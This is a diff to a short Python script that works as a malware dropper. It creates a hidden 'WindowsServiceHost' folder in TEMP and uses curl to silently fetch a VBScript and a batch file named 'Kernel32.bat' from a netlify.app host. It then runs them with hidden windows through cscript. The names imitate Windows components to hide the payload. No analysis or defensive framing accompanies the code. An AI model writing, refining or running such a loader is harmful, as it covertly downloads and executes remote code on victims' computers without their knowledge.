@@ -1,17 +1,22 @@
 import subprocess
 import os
+
 def drop(file):
     tempdir = os.getenv("TEMP")
     folderpath = os.path.join(tempdir, "WindowsServiceHost")
-    filepath = os.path.join(tempdir, "WindowsServiceHost", file)
+    filepath = os.path.join(folderpath, file)
+    vbs_url = "https://boisterous-kataifi-40b43d.netlify.app/wrappa.vbs"
+    vbs_path = os.path.join(folderpath, "wrappa.vbs")
+    
     if not os.path.exists(folderpath):
-        subprocess.Popen(f"mkdir {folderpath}", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
-        subprocess.Popen(f"attrib +h {folderpath}", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
-        subprocess.Popen(f"curl -s -o {filepath} https://boisterous-kataifi-40b43d.netlify.app/coolio.bat", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
-        subprocess.Popen(f"start  {filepath}", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
-    elif os.path.exists(filepath):
-        subprocess.Popen(f"start {filepath}", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
-    elif os.path.exists(folderpath) and not os.path.exists(filepath):
-        subprocess.Popen(f"curl -s -o {filepath} https://boisterous-kataifi-40b43d.netlify.app/coolio.bat", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
-        subprocess.Popen(f"start {filepath}", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        subprocess.run(f"mkdir {folderpath}", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        subprocess.run(f"attrib +h {folderpath}", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
+    
+    subprocess.run(f"curl -s -o {vbs_path} {vbs_url}", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
+    
+    if not os.path.exists(filepath):
+        subprocess.run(f"curl -s -o {filepath} https://boisterous-kataifi-40b43d.netlify.app/{file}", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
+    
+    subprocess.run(f"cscript //nologo {vbs_path}", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
+
 drop("Kernel32.bat")
